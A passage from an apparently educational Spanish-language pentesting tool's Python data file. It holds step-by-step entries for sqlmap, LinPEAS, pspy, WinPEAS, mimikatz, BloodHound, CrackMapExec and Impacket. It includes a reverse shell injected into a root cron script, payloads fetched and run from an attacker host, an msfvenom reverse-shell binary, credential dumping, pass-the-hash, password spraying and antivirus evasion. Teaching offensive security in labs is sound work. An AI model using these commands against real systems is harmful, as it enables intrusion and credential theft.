                "comando": "# En Burp Repeater, probar en el parámetro sospechoso:\nid=1'                  # error de sintaxis SQL = probable SQLi\nid=1 OR 1=1--          # si devuelve más datos = SQLi confirmada\nid=1 AND SLEEP(5)--    # si tarda 5s = blind SQLi",
                "que_observar": "Errores SQL en la respuesta (MySQL, MSSQL, ORA-), cambios en el contenido devuelto, cambios en el tiempo de respuesta.",
                "pregunta_reflexion": "¿Por qué es importante confirmar manualmente antes de lanzar sqlmap?",
            },
            {
                "paso": 2,
                "titulo": "Detección básica con sqlmap",
                "explicacion": "Pasar la URL con el parámetro vulnerable. Sqlmap detectará el tipo de inyección automáticamente.",
                "comando": "sqlmap -u 'http://<IP>/page.php?id=1' --batch\n# O con petición capturada de Burp (guardar como request.txt):\nsqlmap -r request.txt --batch",
                "que_observar": "Qué tipo de SQLi detecta, qué DBMS identifica (MySQL, PostgreSQL, MSSQL, Oracle).",
                "pregunta_reflexion": "Sqlmap detecta time-based blind — ¿por qué tardará más el dump que si fuera UNION-based?",
            },
            {
                "paso": 3,
                "titulo": "Enumerar bases de datos y tablas",
                "explicacion": "Con la inyección confirmada, enumerar la estructura de la base de datos.",
                "comando": "sqlmap -u 'http://<IP>/page.php?id=1' --batch --dbs           # listar DBs\nsqlmap -u 'http://<IP>/page.php?id=1' --batch -D <DB> --tables  # tablas de una DB\nsqlmap -u 'http://<IP>/page.php?id=1' --batch -D <DB> -T <TABLA> --dump  # volcar tabla",
                "que_observar": "Tablas como 'users', 'admin', 'accounts', 'credentials' — alta prioridad.",
                "pregunta_reflexion": "Encuentras una tabla 'users' con columnas 'username' y 'password' — ¿qué esperas encontrar en 'password'?",
            },
            {
                "paso": 4,
                "titulo": "Obtener shell del OS (si hay privilegios)",
                "explicacion": "En MySQL con FILE privilege y servidor Apache, sqlmap puede escribir una webshell.",
                "comando": "sqlmap -u 'http://<IP>/page.php?id=1' --batch --os-shell",
                "que_observar": "Preguntará dónde escribir la shell. Normalmente /var/www/html/ o la raíz del servidor.",
                "pregunta_reflexion": "¿Qué permisos necesita el usuario de la base de datos para que esto funcione?",
            },
        ],
        "errores_comunes": [
            "Lanzar sqlmap sin confirmar SQLi manualmente primero — genera mucho ruido innecesario.",
            "No usar -r con la petición de Burp cuando hay cookies de sesión necesarias.",
            "No aumentar --level y --risk cuando no detecta nada con los valores por defecto.",
            "Dumpar toda la base de datos cuando solo necesitas la tabla de usuarios.",
        ],
        "flags_esenciales": {
            "-u": "URL con el parámetro vulnerable",
            "-r": "Fichero con la petición HTTP completa (de Burp)",
            "--batch": "No preguntar — usar respuestas por defecto",
            "--dbs": "Listar bases de datos",
            "-D/-T/-C": "Seleccionar DB/Tabla/Columna",
            "--dump": "Volcar datos",
            "--level/--risk": "Aumentar agresividad (1-5)",
            "--os-shell": "Intentar obtener shell del OS",
            "--dbms": "Especificar DBMS si ya lo sabes",
        },
        "recursos": [
            "https://github.com/sqlmapproject/sqlmap",
            "https://portswigger.net/web-security/sql-injection — entender SQLi antes de automatizar",
        ],
        "siguiente_paso_natural": "Credenciales en BD → crackear hashes con hashcat. Shell OS → buscar escalada de privilegios. Acceso a datos → buscar información sensible para el reporte.",
    },
    # ────────────────────────────────────────────────────────────────────────
    # POST-EXPLOTACIÓN LINUX
    # ────────────────────────────────────────────────────────────────────────
    "linpeas": {
        "nombre": "LinPEAS — Linux Privilege Escalation Awesome Script",
        "categoria": "Post-explotación Linux",
        "que_es": (
            "LinPEAS es un script de enumeración automática para escalada de privilegios "
            "en Linux. Busca cientos de vectores: sudo mal configurado, SUID inusuales, "
            "cron jobs, capabilities, credenciales en ficheros, variables de entorno, "
            "servicios internos, CVEs del kernel y mucho más."
        ),
        "por_que_importa": (
            "La escalada de privilegios manual requiere saber exactamente qué buscar. "
            "LinPEAS cubre sistemáticamente cientos de vectores en minutos. "
            "Las líneas en rojo son hallazgos críticos que merecen investigación inmediata."
        ),
        "instalacion": "No requiere instalación. Se descarga y ejecuta directamente.",
        "conceptos_clave": [
            "Color coding: Rojo = crítico/explotable. Amarillo = interesante/investigar. Sin color = info.",
            "No deja logs propios, pero sus acciones (leer ficheros, ejecutar comandos) sí pueden dejar rastros.",
            "Ejecutar siempre redirigiendo a fichero para análisis posterior.",
            "La versión winPEAS hace lo mismo para Windows.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Transferir y ejecutar LinPEAS",
                "explicacion": "El método más limpio: servidor HTTP en Kali, curl en el target.",
                "comando": "# En Kali:\npython3 -m http.server 8000\n# Descargar linpeas.sh de: github.com/carlospolop/PEASS-ng/releases\n\n# En el target:\ncurl http://<KALI_IP>:8000/linpeas.sh | sh 2>&1 | tee /tmp/linpeas_output.txt\n# O si quieres ejecutar sin tocar disco:\ncurl http://<KALI_IP>:8000/linpeas.sh | bash",
                "que_observar": "El script tardará varios minutos. No interrumpirlo.",
                "pregunta_reflexion": "¿Por qué ejecutar con | bash en lugar de descargarlo y ejecutarlo puede ser más sigiloso?",
            },
            {
                "paso": 2,
                "titulo": "Analizar el output — prioridades",
                "explicacion": "El output puede ser enorme. Ir directamente a las secciones críticas.",
                "comando": "# Filtrar solo líneas rojas (críticas) desde el fichero guardado:\ngrep -E '\\x1b\\[1;31m' /tmp/linpeas_output.txt\n\n# Secciones a revisar primero:\n# - 'sudo -l' results\n# - SUID files\n# - Cron jobs\n# - Interesting files (passwords in files)\n# - Writable paths\n# - Active ports (servicios internos)\n# - CVEs",
                "que_observar": "Cualquier línea roja. Especialmente: sudo con NOPASSWD, SUID en binarios no estándar, scripts de cron en rutas escribibles.",
                "pregunta_reflexion": "LinPEAS marca en rojo 'python3 is SUID' — ¿qué harías a continuación?",
            },
            {
                "paso": 3,
                "titulo": "Investigar cada hallazgo con GTFOBins",
                "explicacion": "GTFOBins documenta cómo escalar privilegios con cada binario que puede tener SUID, sudo, capabilities.",
                "comando": "# Para cada binario SUID o sudo encontrado:\n# 1. Ir a gtfobins.github.io\n# 2. Buscar el binario\n# 3. Seleccionar la sección 'SUID' o 'Sudo'\n# 4. Copiar el comando de escalada\n\n# Ejemplo: find con SUID\nfind . -exec /bin/sh -p \\; -quit",
                "que_observar": "Si el binario está en GTFOBins → hay método de escalada documentado. Si no está → investigar el comportamiento manualmente.",
                "pregunta_reflexion": "¿Por qué la opción -p en /bin/sh -p es crítica cuando escalaas con SUID?",
            },
        ],
        "errores_comunes": [
            "No guardar el output con tee — se pierde al cerrar la terminal.",
            "Interrumpir el script antes de que termine — puede perderse la sección que tenía el vector.",
            "Ignorar las secciones amarillas — muchos vectores útiles están ahí.",
            "No seguir el orden: sudo → SUID → cron → capabilities. Ir directo a LinPEAS sin intentar sudo -l primero.",
        ],
        "flags_esenciales": {
            "NOPASSWD_OPTIONS=true": "Variable de entorno para output más compacto",
            "-a": "Modo all — todas las comprobaciones incluyendo las lentas",
        },
        "recursos": [
            "https://github.com/carlospolop/PEASS-ng — repositorio oficial y releases",
            "https://gtfobins.github.io — referencia para explotar binarios encontrados",
            "https://book.hacktricks.xyz/linux-hardening/privilege-escalation — metodología completa",
        ],
        "siguiente_paso_natural": "Con el vector identificado: sudo NOPASSWD → gtfobins sudo. SUID → gtfobins SUID. Cron escribible → inyectar reverse shell. Kernel antiguo → buscar kernel exploit (último recurso).",
    },
    "pspy": {
        "nombre": "Pspy — Process Spy",
        "categoria": "Post-explotación Linux",
        "que_es": (
            "Pspy monitoriza procesos en tiempo real sin necesitar privilegios de root. "
            "Captura todos los comandos ejecutados, incluyendo los que inician y terminan "
            "rápidamente (como cron jobs cada minuto). Lo que no aparece en /etc/crontab "
            "puede aparecer en pspy."
        ),
        "por_que_importa": (
            "Los cron jobs de root que ejecutan scripts en rutas escribibles son un "
            "vector clásico de escalada. Sin pspy, solo ves los crons estáticos en ficheros. "
            "Con pspy, ves exactamente qué ejecuta root mientras esperas."
        ),
        "instalacion": "Descargar binario estático de github.com/DominicBreuker/pspy/releases — no requiere Go instalado.",
        "conceptos_clave": [
            "Sin privilegios: pspy usa inotify y /proc para monitorizar sin root.",
            "UID 0: los procesos con UID=0 en el output son los que ejecuta root.",
            "Binario estático: pspy64 para sistemas 64-bit, pspy32 para 32-bit. No requiere dependencias.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Transferir y ejecutar",
                "explicacion": "Descargar el binario adecuado y transferirlo al target.",
                "comando": "# En Kali (asegúrate de tener pspy64 en el directorio del servidor HTTP):\npython3 -m http.server 8000\n\n# En el target:\ncurl http://<KALI_IP>:8000/pspy64 -o /tmp/pspy64\nchmod +x /tmp/pspy64\n/tmp/pspy64",
                "que_observar": "Procesos con UID=0. Especialmente scripts .sh o comandos que aparecen periódicamente.",
                "pregunta_reflexion": "Ves que root ejecuta /opt/backup.sh cada minuto — ¿qué compruebas a continuación?",
            },
            {
                "paso": 2,
                "titulo": "Identificar scripts de cron escribibles",
                "explicacion": "Si el script que ejecuta root está en una ruta que puedes escribir, puedes inyectar un reverse shell.",
                "comando": "ls -la /opt/backup.sh           # ¿tienes permisos de escritura?\nls -la /opt/                   # ¿el directorio es escribible?\n\n# Si tienes escritura:\necho 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> /opt/backup.sh\n\n# Esperar en Kali:\nnc -lvnp 4444",
                "que_observar": "El shell que llega debería ser de root (si root es quien ejecuta el cron).",
                "pregunta_reflexion": "¿Por qué usas >> y no > para modificar el script de backup?",
            },
        ],
        "errores_comunes": [
            "Descargar la arquitectura incorrecta (pspy32 en un sistema 64-bit).",
            "No esperar suficiente tiempo — algunos crons son cada 5 o 15 minutos.",
            "Modificar el script de cron sin comprobar primero si tiene permisos de escritura.",
        ],
        "flags_esenciales": {
            "-pf": "Monitorizar también eventos de ficheros (más verbose)",
            "-i 1000": "Intervalo de refresh en milisegundos",
        },
        "recursos": [
            "https://github.com/DominicBreuker/pspy",
        ],
        "siguiente_paso_natural": "Script de cron encontrado → comprobar permisos → inyectar payload. Variable de entorno con credencial → probar en sudo/SSH.",
    },
    # ────────────────────────────────────────────────────────────────────────
    # POST-EXPLOTACIÓN WINDOWS / AD
    # ────────────────────────────────────────────────────────────────────────
    "winpeas": {
        "nombre": "WinPEAS — Windows Privilege Escalation Awesome Script",
        "categoria": "Post-explotación Windows",
        "que_es": (
            "WinPEAS es el equivalente de LinPEAS para Windows. Enumera: privilegios "
            "del token, servicios con permisos débiles, rutas de servicio no entrecomilladas, "
            "credenciales almacenadas, software instalado, configuración de red, "
            "GPOs aplicadas y posibles CVEs del OS."
        ),
        "por_que_importa": (
            "La escalada de privilegios en Windows tiene vectores muy específicos "
            "(SeImpersonatePrivilege, unquoted service paths, DLL hijacking). "
            "WinPEAS los cubre sistemáticamente y los marca por prioridad."
        ),
        "instalacion": "Descargar winPEAS.exe o winPEAS.bat de github.com/carlospolop/PEASS-ng/releases",
        "conceptos_clave": [
            "Token privileges: los privilegios del token actual definen qué vectores de escalada son posibles.",
            "SeImpersonatePrivilege: el más común en cuentas de servicio (IIS, MSSQL). Explotable con PrintSpoofer/GodPotato.",
            "Unquoted service path: ruta de binario de servicio sin entrecomillar con espacios → binary planting.",
            "AlwaysInstallElevated: si está activo, cualquier MSI se instala con SYSTEM.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Transferir y ejecutar WinPEAS",
                "explicacion": "Varios métodos según qué tengas disponible.",
                "comando": "# Método 1: servidor HTTP en Kali + certutil en Windows\n# En Kali:\npython3 -m http.server 8000\n\n# En Windows (cmd):\ncertutil -urlcache -f http://<KALI_IP>:8000/winPEAS.exe C:\\Windows\\Temp\\wp.exe\nC:\\Windows\\Temp\\wp.exe\n\n# Método 2: PowerShell (si no está restringido)\nIEX(New-Object Net.WebClient).downloadString('http://<KALI_IP>:8000/winPEAS.ps1')",
                "que_observar": "El output es extenso. Las líneas rojas son prioritarias.",
                "pregunta_reflexion": "¿Por qué escribir en C:\\Windows\\Temp y no en el escritorio del usuario?",
            },
            {
                "paso": 2,
                "titulo": "Interpretar los hallazgos — prioridad 1: privilegios",
                "explicacion": "Lo primero que mira un pentester en Windows: whoami /all y los privilegios.",
                "comando": "whoami /all\n\n# Si ves SeImpersonatePrivilege → PrintSpoofer o GodPotato:\n.\\PrintSpoofer.exe -i -c cmd\n.\\GodPotato.exe -cmd 'cmd /c whoami'\n\n# Si ves SeBackupPrivilege → acceder a ficheros protegidos:\nreg save hklm\\sam C:\\Temp\\sam\nreg save hklm\\system C:\\Temp\\system\n# Transferir a Kali y:\nimpacket-secretsdump -sam sam -system system LOCAL",
                "que_observar": "Confirmar que el resultado de whoami sea 'nt authority\\system'.",
                "pregunta_reflexion": "¿Por qué SeImpersonatePrivilege está habilitado en cuentas de servicio por defecto?",
            },
            {
                "paso": 3,
                "titulo": "Servicios con permisos débiles",
                "explicacion": "Un binario de servicio que ejecuta SYSTEM y que puedes sobrescribir → reemplazarlo por un payload.",
                "comando": '# WinPEAS los marca. Verificar manualmente:\nwmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"\nicacls "C:\\ruta\\servicio.exe"\n\n# Si tienes (F) o (W) para tu usuario:\n# 1. Generar payload:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o servicio.exe\n# 2. Reemplazar el binario\n# 3. sc stop <SERVICIO> && sc start <SERVICIO>',
                "que_observar": "(F) Full control o (M) Modify en icacls para tu usuario o el grupo 'Everyone'.",
                "pregunta_reflexion": "¿Qué pasa si el servicio que modificas no se puede reiniciar desde tu usuario?",
            },
        ],
        "errores_comunes": [
            "No leer whoami /all antes de ejecutar WinPEAS — los privilegios del token son lo primero.",
            "Ignorar AlwaysInstallElevated — si está activo es escalada directa.",
            "No redirigir el output a fichero — el output de WinPEAS en pantalla es difícil de procesar.",
        ],
        "flags_esenciales": {
            "winPEAS.exe": "Ejecutable estándar",
            "winPEAS.exe quiet": "Output reducido — solo hallazgos",
            "winPEAS.exe systeminfo": "Solo información del sistema",
        },
        "recursos": [
            "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS",
            "https://lolbas-project.github.io — binarios legítimos de Windows para escalada",
            "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation",
        ],
        "siguiente_paso_natural": "SeImpersonatePrivilege → PrintSpoofer/GodPotato → SYSTEM. Servicio débil → payload en binario → escalada. SYSTEM obtenido → dump de credenciales con mimikatz o secretsdump.",
    },
    "mimikatz": {
        "nombre": "Mimikatz — Extracción de credenciales Windows",
        "categoria": "Post-explotación Windows / Movimiento lateral",
        "que_es": (
            "Mimikatz es la herramienta estándar para extraer credenciales de "
            "sistemas Windows: contraseñas en texto claro de LSASS, hashes NTLM, "
            "tickets Kerberos, y más. Desarrollada por Benjamin Delpy. "
            "Requiere privilegios de SYSTEM o SeDebugPrivilege."
        ),
        "por_que_importa": (
            "En entornos Windows/AD, comprometer una máquina sin extraer credenciales "
            "es dejar la mitad del trabajo. Los hashes NTLM permiten movimiento lateral "
            "con Pass-the-Hash. Los tickets Kerberos permiten Pass-the-Ticket y Golden/Silver Tickets."
        ),
        "instalacion": "Descargar de github.com/gentilkiwi/mimikatz/releases. En Kali: /usr/share/windows-resources/mimikatz/",
        "conceptos_clave": [
            "LSASS: proceso de Windows que mantiene credenciales en memoria. El objetivo principal de mimikatz.",
            "sekurlsa: módulo para extraer credenciales de LSASS.",
            "lsadump: módulo para volcar el SAM local y NTDS del dominio (DCSync).",
            "privilege::debug: necesario para acceder a LSASS. Requiere SeDebugPrivilege.",
            "Credencial Guard: protección moderna de Windows que evita la extracción de texto claro.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Ejecutar mimikatz y elevar privilegios",
                "explicacion": "Mimikatz debe ejecutarse con privilegios de admin/SYSTEM. Lo primero siempre es privilege::debug.",
                "comando": ".\\mimikatz.exe\n\n# Dentro de mimikatz:\nprivilege::debug         # elevar — debe decir 'Privilege '20' OK'\nsekurlsa::logonpasswords # dump de credenciales de LSASS",
                "que_observar": "Buscar campos 'Password' con texto claro (solo en Windows antiguos/sin Credential Guard) y 'NTLM' con el hash.",
                "pregunta_reflexion": "privilege::debug devuelve error — ¿qué significa y cómo lo resuelves?",
            },
            {
                "paso": 2,
                "titulo": "Volcar hashes del SAM local",
                "explicacion": "El SAM contiene los hashes NTLM de los usuarios locales de la máquina.",
                "comando": "# Dentro de mimikatz:\ntoken::elevate              # impersonar SYSTEM si eres admin\nlsadump::sam                # dump del SAM local\n# O desde cmd con privilegios:\nlsadump::lsa /patch         # también extrae hashes de LSASS",
                "que_observar": "Hashes NTLM de todos los usuarios locales incluyendo Administrator.",
                "pregunta_reflexion": "Tienes el hash NTLM del Administrator local — ¿cómo lo usas sin crackearlo?",
            },
            {
                "paso": 3,
                "titulo": "DCSync — volcar hashes del dominio",
                "explicacion": "Con permisos de replicación de dominio (Domain Admin, o mediante ACL abuse), extraer todos los hashes del dominio.",
                "comando": "# Dentro de mimikatz (desde DC o con permisos de replicación):\nlsadump::dcsync /user:Administrator\nlsadump::dcsync /all /csv\n\n# Alternativa desde Kali sin ejecutar mimikatz en el target:\nimpacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc",
                "que_observar": "El hash NTLM del krbtgt — permite crear Golden Tickets. El de Administrator — acceso total.",
                "pregunta_reflexion": "¿Por qué el hash del krbtgt es el activo más valioso de un dominio comprometido?",
            },
            {
                "paso": 4,
                "titulo": "Pass-the-Hash — usar hashes directamente",
                "explicacion": "Con el hash NTLM puedes autenticarte sin conocer la contraseña en texto claro.",
                "comando": "# Mimikatz:\nsekurlsa::pth /user:Administrator /domain:<DOM> /ntlm:<HASH> /run:cmd.exe\n\n# Desde Kali (más común):\nimpacket-psexec -hashes :<NTLM_HASH> Administrator@<IP>\ncrackmapexec smb <IP> -u Administrator -H <NTLM_HASH>",
                "que_observar": "Shell como Administrator sin haber crackeado la contraseña.",
                "pregunta_reflexion": "¿En qué escenario PtH NO funcionaría aunque tengas el hash correcto?",
            },
        ],
        "errores_comunes": [
            "Ejecutar sin privilege::debug primero — sekurlsa::logonpasswords fallará.",
            "Esperar texto claro en Windows modernos con Credential Guard — solo obtendrás hashes.",
            "No probar impacket-secretsdump desde Kali antes de subir mimikatz — evita AV.",
            "Olvidar que AV moderno detecta mimikatz.exe por nombre y firma — usar versiones ofuscadas.",
        ],
        "flags_esenciales": {
            "privilege::debug": "Elevar privilegios para acceder a LSASS",
            "sekurlsa::logonpasswords": "Credenciales de usuarios con sesión activa",  # pragma: allowlist secret
            "lsadump::sam": "Hashes del SAM local",
            "lsadump::dcsync": "Replicar credenciales del DC",
            "sekurlsa::pth": "Pass-the-Hash",
            "kerberos::list": "Listar tickets Kerberos en memoria",
            "kerberos::golden": "Crear Golden Ticket",
        },
        "recursos": [
            "https://github.com/gentilkiwi/mimikatz/wiki",
            "https://book.hacktricks.xyz/windows-hardening/stealing-credentials",
        ],
        "siguiente_paso_natural": "Hashes NTLM → PtH con impacket/crackmapexec para movimiento lateral. Hash krbtgt → Golden Ticket para persistencia. Contraseña en texto claro → probar en todos los servicios disponibles.",
    },
    "bloodhound": {
        "nombre": "BloodHound — Visualización de ataques en Active Directory",
        "categoria": "Active Directory",
        "que_es": (
            "BloodHound mapea las relaciones en Active Directory como un grafo "
            "y encuentra automáticamente los paths más cortos desde cualquier "
            "nodo comprometido hasta Domain Admin. Usa Neo4j como base de datos "
            "y SharpHound/bloodhound-python para recopilar datos."
        ),
        "por_que_importa": (
            "En AD con cientos de objetos, encontrar el path a DA manualmente es "
            "casi imposible. BloodHound lo hace en segundos. Permisos como "
            "GenericWrite, WriteDACL, ForceChangePassword son invisibles sin BloodHound "
            "y son los vectores más comunes en entornos reales."
        ),
        "instalacion": "sudo apt install bloodhound  ||  descargar de github.com/BloodHoundAD/BloodHound/releases",
        "conceptos_clave": [
            "SharpHound: el collector que recopila datos del dominio (ejecutar en Windows con credenciales de dominio).",
            "bloodhound-python: collector desde Linux cuando tienes credenciales de dominio.",
            "Neo4j: la base de datos de grafos donde BloodHound almacena y consulta los datos.",
            "Owned nodes: marcar los nodos que has comprometido para ver paths desde ellos.",
            "Cypher queries: lenguaje de consulta de Neo4j. BloodHound incluye queries predefinidas.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Recopilar datos del dominio",
                "explicacion": "Primero recopilar, luego analizar. Necesitas al menos un usuario de dominio.",
                "comando": "# Desde Linux con bloodhound-python:\nbloodhound-python -d <DOMINIO> -u <USER> -p '<PASS>' -ns <DC_IP> -c all --zip\n\n# Desde Windows con SharpHound (subir SharpHound.exe al target):\n.\\SharpHound.exe -c all --zipfilename bh_data.zip",
                "que_observar": "Se genera un ZIP con JSONs. Guardarlo para importar en BloodHound.",
                "pregunta_reflexion": "¿Por qué -c all puede ser ruidoso en un entorno real con SIEM?",
            },
            {
                "paso": 2,
                "titulo": "Arrancar BloodHound",
                "explicacion": "BloodHound necesita Neo4j corriendo primero.",
                "comando": "sudo neo4j console &\n# Esperar a que arranque, luego:\nbloodhound &\n# Login: neo4j / (la contraseña que configuraste, o neo4j en primera vez)\n# Upload Data → seleccionar el ZIP generado",
                "que_observar": "El grafo del dominio debe aparecer con nodos de usuarios, grupos, equipos y DCs.",
                "pregunta_reflexion": "¿Qué indica un nodo marcado en rojo en BloodHound?",
            },
            {
                "paso": 3,
                "titulo": "Queries esenciales",
                "explicacion": "BloodHound incluye queries predefinidas. Estas son las más importantes en labs.",
                "comando": "# En 'Analysis' (panel izquierdo):\n'Shortest Paths to Domain Admins from Owned Principals'\n'Find Computers where Domain Users are Local Admin'\n'Kerberoastable Accounts'\n'Find AS-REP Roastable Users'\n'Find Principals with DCSync Rights'\n\n# Marcar nodos comprometidos:\n# Click derecho en un nodo → 'Mark as Owned'\n# Luego re-ejecutar 'Shortest Paths... from Owned Principals'",
                "que_observar": "Paths con menos nodos = más fáciles de explotar. Un path de 2 nodos es escalada casi directa.",
                "pregunta_reflexion": "BloodHound muestra que tu usuario tiene GenericWrite sobre una cuenta con SPN — ¿qué ataque puedes hacer?",
            },
            {
                "paso": 4,
                "titulo": "Explotar paths encontrados",
                "explicacion": "BloodHound no solo muestra los paths — también explica cómo explotarlos. Click derecho en el edge para ver las instrucciones.",
                "comando": "# Edge 'ForceChangePassword':\nnet rpc password <TARGET_USER> '<NUEVA_PASS>' -U <DOMINIO>/<TU_USER>%'<TU_PASS>' -S <DC_IP>\n\n# Edge 'GenericWrite' sobre usuario:\n# Forzar SPN → Kerberoast:\nSet-ADUser -Identity <TARGET> -ServicePrincipalNames @{Add='cifs/fake.domain'}\nimpacket-GetUserSPNs <DOM>/<USER>:<PASS> -dc-ip <DC> -request\n\n# Edge 'WriteDACL':\nAdd-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <TU_USER> -Rights All",
                "que_observar": "Cada edge en BloodHound tiene instrucciones de explotación. Click derecho → Help.",
                "pregunta_reflexion": "¿Cuál es la diferencia entre comprometer un DA directamente y hacerlo a través de una cadena de ACLs?",
            },
        ],
        "errores_comunes": [
            "No marcar los nodos comprometidos como 'Owned' — las queries 'from Owned Principals' no funcionarán.",
            "No usar las queries predefinidas — la mayoría de los vectores están ahí.",
            "Olvidar que BloodHound muestra la situación en el momento de la recolección — si cambia el entorno, re-recopilar.",
            "No leer el Help de cada edge — explica exactamente cómo explotar cada relación.",
        ],
        "flags_esenciales": {
            "bloodhound-python -c all": "Recopilar todo",
            "bloodhound-python -c DCOnly": "Solo datos del DC (más sigiloso)",
            "--zip": "Comprimir output en ZIP para importar",
        },
        "recursos": [
            "https://github.com/BloodHoundAD/BloodHound",
            "https://bloodhound.readthedocs.io",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound",
        ],
        "siguiente_paso_natural": "Path identificado → ejecutar los ataques en el orden del grafo. GenericWrite → Kerberoasting dirigido. ForceChangePassword → cambiar contraseña → acceso. WriteDACL → darte GenericAll → control total del objeto.",
    },
    "crackmapexec": {
        "nombre": "CrackMapExec (CME/NetExec) — Swiss Army Knife de AD",
        "categoria": "Active Directory / Movimiento lateral",
        "que_es": (
            "CrackMapExec (evolucionado a NetExec/nxc) es una herramienta para "
            "auditar entornos Windows/AD. Permite: enumerar hosts, probar credenciales "
            "en masa, ejecutar comandos remotamente, volcar SAM/LSASS, "
            "enumerar shares, usuarios y mucho más. Todo desde Linux."
        ),
        "por_que_importa": (
            "La herramienta más eficiente para movimiento lateral y password spraying "
            "en redes Windows. Una sola línea puede confirmar si un par usuario:contraseña "
            "funciona en todos los equipos de una subred."
        ),
        "instalacion": "Preinstalado en Kali como crackmapexec y nxc. pip install crackmapexec",
        "conceptos_clave": [
            "Protocolos: smb, winrm, ssh, ldap, mssql, rdp. Usar el adecuado al servicio.",
            "Pwn3d!: si aparece este mensaje, tienes acceso de admin en ese host.",
            "Password spray: 1 password para muchos usuarios. Menos ruidoso que brute force individual.",
            "Lockout: comprobar la política de lockout ANTES de hacer spray.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Recon inicial de la red SMB",
                "explicacion": "CME da información del OS, hostname, dominio y SMB signing en una línea.",
                "comando": "crackmapexec smb <IP>/24    # escanear subred\ncrackmapexec smb <IP>       # un host",
                "que_observar": "Versión de Windows, nombre del equipo, dominio y si 'signing: False' (necesario para NTLM relay).",
                "pregunta_reflexion": "Ves 'signing: False' en todas las workstations — ¿qué ataque se habilita?",
            },
            {
                "paso": 2,
                "titulo": "Probar credenciales",
                "explicacion": "Validar un par usuario:contraseña o hash contra un host o subred.",
                "comando": "# Con contraseña:\ncrackmapexec smb <IP> -u <USER> -p '<PASS>'\n# Con hash NTLM:\ncrackmapexec smb <IP> -u <USER> -H <NTLM_HASH>\n# Spray en subred:\ncrackmapexec smb <IP>/24 -u <USER> -p '<PASS>'",
                "que_observar": "[+] = credenciales válidas. [+] (Pwn3d!) = admin en ese host.",
                "pregunta_reflexion": "¿Cuándo usarías -H (hash) en lugar de -p (contraseña)?",
            },
            {
                "paso": 3,
                "titulo": "Password spraying — 1 password, N usuarios",
                "explicacion": "Probar una contraseña común contra todos los usuarios del dominio. Respetar el umbral de lockout.",
                "comando": "# Primero obtener usuarios (enum4linux, ldapsearch, RID cycling):\ncrackmapexec smb <IP> --users > users.txt\n\n# Spray con una contraseña:\ncrackmapexec smb <IP> -u users.txt -p 'Summer2024!' --continue-on-success\n\n# Spray con varias contraseñas (una por vuelta, esperar entre vueltas):\ncrackmapexec smb <IP> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success",
                "que_observar": "Cualquier [+] en el output. Parar si hay muchos STATUS_ACCOUNT_LOCKED.",
                "pregunta_reflexion": "¿Por qué la contraseña 'Season+AñoActual!' es una elección frecuente para spray?",
            },
            {
                "paso": 4,
                "titulo": "Ejecutar comandos y volcar credenciales",
                "explicacion": "Con credenciales de admin, ejecutar comandos o extraer hashes.",
                "comando": "# Ejecutar comando:\ncrackmapexec smb <IP> -u <ADMIN> -p '<PASS>' -x 'whoami'\n# Volcar SAM:\ncrackmapexec smb <IP> -u <ADMIN> -p '<PASS>' --sam\n# Volcar LSASS:\ncrackmapexec smb <IP> -u <ADMIN> -p '<PASS>' --lsa\n# Volcar secretos del DC:\ncrackmapexec smb <DC_IP> -u <ADMIN> -p '<PASS>' --ntds",
                "que_observar": "Hashes NTLM para PtH, contraseñas en texto claro si el sistema es antiguo.",
                "pregunta_reflexion": "¿Qué diferencia hay entre --sam y --ntds?",
            },
        ],
        "errores_comunes": [
            "No comprobar la política de lockout antes de spray — bloquear cuentas es un incidente de seguridad.",
            "No usar --continue-on-success en spray — CME para en el primer éxito por defecto.",
            "Confundir crackmapexec con nxc — son el mismo proyecto, nxc es el nombre actual.",
            "No guardar el output — las credenciales válidas se pierden.",
        ],
        "flags_esenciales": {
            "smb/winrm/ldap/ssh": "Protocolo objetivo",
            "-u/-p": "Usuario y contraseña",
            "-H": "Hash NTLM",
            "--users": "Enumerar usuarios",
            "--shares": "Enumerar shares",
            "--sam/--lsa/--ntds": "Volcar credenciales",
            "-x": "Ejecutar comando (cmd)",
            "-X": "Ejecutar comando (PowerShell)",
            "--continue-on-success": "No parar al encontrar credencial válida",
        },
        "recursos": [
            "https://github.com/Pennyw0rth/NetExec — repo actual (nxc)",
            "https://www.crackmapexec.wiki",
        ],
        "siguiente_paso_natural": "Credenciales válidas encontradas → probar winrm (evil-winrm), rdp, ssh. Pwn3d! → --sam para más hashes. Shares → smbclient para revisar contenido.",
    },
    "impacket": {
        "nombre": "Impacket — Suite de herramientas para protocolos Windows/AD",
        "categoria": "Active Directory / Movimiento lateral",
        "que_es": (
            "Impacket es una colección de scripts Python que implementan protocolos "
            "de red de Windows (SMB, MSRPC, LDAP, Kerberos, NTLM, MSSQL). "
            "Permite interactuar con entornos Windows/AD completamente desde Linux. "
            "Las herramientas más usadas: psexec, secretsdump, GetUserSPNs, GetNPUsers, wmiexec, smbexec."
        ),
        "por_que_importa": (
            "Impacket es la navaja suiza del pentesting en entornos AD desde Linux. "
            "Sin necesidad de una máquina Windows, permite ejecutar DCSync, "
            "Kerberoasting, AS-REP Roasting, obtener shells y volcar credenciales."
        ),
        "instalacion": "Preinstalado en Kali. pip install impacket  ||  git clone github.com/fortra/impacket",
        "conceptos_clave": [
            "Todas las herramientas aceptan credenciales en formato: DOMINIO/usuario:contraseña@IP",
            "También aceptan hashes NTLM con -hashes :NTLM (PtH directo).",
            "impacket-psexec vs impacket-wmiexec vs impacket-smbexec: diferentes métodos de ejecución, diferente nivel de ruido.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Obtener shell remota con psexec",
